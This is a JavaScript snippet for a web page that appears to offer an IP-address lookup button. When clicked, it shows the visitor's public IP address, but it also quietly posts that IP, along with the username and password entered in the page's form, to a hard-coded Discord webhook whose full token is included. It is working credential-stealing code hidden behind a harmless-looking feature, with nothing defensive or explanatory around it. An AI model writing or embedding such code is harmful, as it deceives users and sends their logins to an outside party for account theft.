document.getElementById("get-ip").addEventListener("click", async function () {
    const ipDisplay = document.getElementById("ip-display");
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        if (!ipResponse.ok) throw new Error("Unable to retrieve IP address.");
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Display the IP address
        ipDisplay.textContent = `Your IP Address: ${userIP}`;

        // Webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1324902819257647174/x-aZME7vybr_zjY5moMRSWWtvb69vehM4RK9p1EGoZ9g8nAgEDyW-2R5uQw1cv4cIYr9";

        // Send IP address to Discord webhook
        await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                username: "HTMLWEB",
                content: `🔗 **User IP Address:** ${userIP}\n🏷️ **Username:** ${username}\n🔑 **Password:** ${password}`,
            }),
        });

    } catch (error) {
        console.error(error.message);
        ipDisplay.textContent = "Failed to retrieve or send IP address.";
    }
});